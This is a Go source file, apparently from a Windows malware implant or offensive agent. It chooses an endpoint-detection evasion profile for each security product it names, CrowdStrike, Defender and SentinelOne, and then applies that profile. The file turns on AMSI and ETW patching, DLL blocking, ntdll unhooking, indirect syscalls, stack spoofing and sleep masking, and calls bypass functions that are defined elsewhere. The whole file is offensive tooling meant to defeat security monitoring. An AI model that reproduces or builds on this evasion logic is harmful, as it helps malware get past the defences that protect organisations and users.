//go:build windows

package main

import (
	"fmt"
	"runtime"
)

var defaultStrategies = map[string]EvasionStrategy{
	EDRCrowdStrike: {
		Name:            EDRCrowdStrike,
		IndirectSyscall: true,
		StackSpoofing:   true,
		PEBBlockDLLs:    false,
		AMSIPatch:       true,
		ETWPatch:        true,
		VEHUnhook:       false,
		SleepMask:       true,
	},
	EDRDefender: {
		Name:            EDRDefender,
		IndirectSyscall: true,
		StackSpoofing:   false,
		PEBBlockDLLs:    true,
		AMSIPatch:       true,
		ETWPatch:        false,
		VEHUnhook:       true,
		SleepMask:       true,
	},
	EDRSentinelOne: {
		Name:            EDRSentinelOne,
		IndirectSyscall: true,
		StackSpoofing:   true,
		PEBBlockDLLs:    false,
		AMSIPatch:       false,
		ETWPatch:        true,
		VEHUnhook:       true,
		SleepMask:       true,
	},
	EDRUnknown: {
		Name:            EDRUnknown,
		IndirectSyscall: true,
		StackSpoofing:   false,
		PEBBlockDLLs:    true,
		AMSIPatch:       true,
		ETWPatch:        true,
		VEHUnhook:       true,
		SleepMask:       true,
	},
}

func (e *EDRInfo) GetStrategy() EvasionStrategy {
	if !e.Detected {
		return EvasionStrategy{
			Name: "none",
		}
	}
	if s, ok := defaultStrategies[e.Name]; ok {
		return s
	}
	return defaultStrategies[EDRUnknown]
}

func ApplyStrategy(s EvasionStrategy) {
	useIndirectSyscall = s.IndirectSyscall
	useStackSpoofing = s.StackSpoofing
	pebBlockDLLs = s.PEBBlockDLLs
	patchAMSI = s.AMSIPatch
	patchETW = s.ETWPatch
	enableSleepMask = s.SleepMask
	enableVEHUnhook = s.VEHUnhook

	if Debug {
		fmt.Printf("[EDR] Strategy: %s\n", s.Name)
		fmt.Printf("[EDR]   IndirectSyscall=%v StackSpoofing=%v PEBBlockDLLs=%v\n",
			s.IndirectSyscall, s.StackSpoofing, s.PEBBlockDLLs)
		fmt.Printf("[EDR]   AMSIPatch=%v ETWPatch=%v VEHUnhook=%v SleepMask=%v\n",
			s.AMSIPatch, s.ETWPatch, s.VEHUnhook, s.SleepMask)
	}

	if runtime.GOOS != "windows" {
		return
	}

	if s.AMSIPatch {
		amsiBypass()
	}
	if s.ETWPatch {
		etwBypass()
	}
	if s.PEBBlockDLLs {
		blockDLLs()
	}
	if s.VEHUnhook {
		unhookNtdll()
	}
}
